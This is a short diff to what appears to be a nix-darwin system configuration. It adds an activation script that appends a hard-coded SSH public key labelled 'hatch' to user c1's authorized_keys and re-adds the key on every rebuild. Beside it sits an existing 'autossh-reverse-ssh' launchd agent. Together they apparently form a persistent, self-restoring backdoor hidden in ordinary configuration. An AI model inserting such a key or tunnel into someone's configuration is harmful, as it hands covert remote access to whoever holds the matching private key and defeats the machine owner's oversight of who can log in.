@@ -89,6 +89,18 @@ with lib;
 
     home.file.".ssh/config.d/relay.conf".source = ../../config/ssh/relay.conf;
 
+    system.activationScripts.postActivation.text = mkAfter ''
+      auth_keys="/Users/c1/.ssh/authorized_keys"
+      hatch_key='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAT99NXjXmvNed4x5jqL60l4A8ZWiDa0Sn7f9SbBJPdQ hatch'
+      /usr/bin/install -d -m 0700 -o c1 -g staff /Users/c1/.ssh
+      if [ ! -f "$auth_keys" ] || ! /usr/bin/grep -Fqx -- "$hatch_key" "$auth_keys"; then
+        /usr/bin/printf '%s\n' "$hatch_key" >> "$auth_keys"
+      fi
+      /usr/sbin/chown c1:staff "$auth_keys"
+      /bin/chmod 0600 "$auth_keys"
+      unset auth_keys hatch_key
+    '';
+
     launchd.user.agents.autossh-reverse-ssh = {
       serviceConfig = {
         ProgramArguments = [
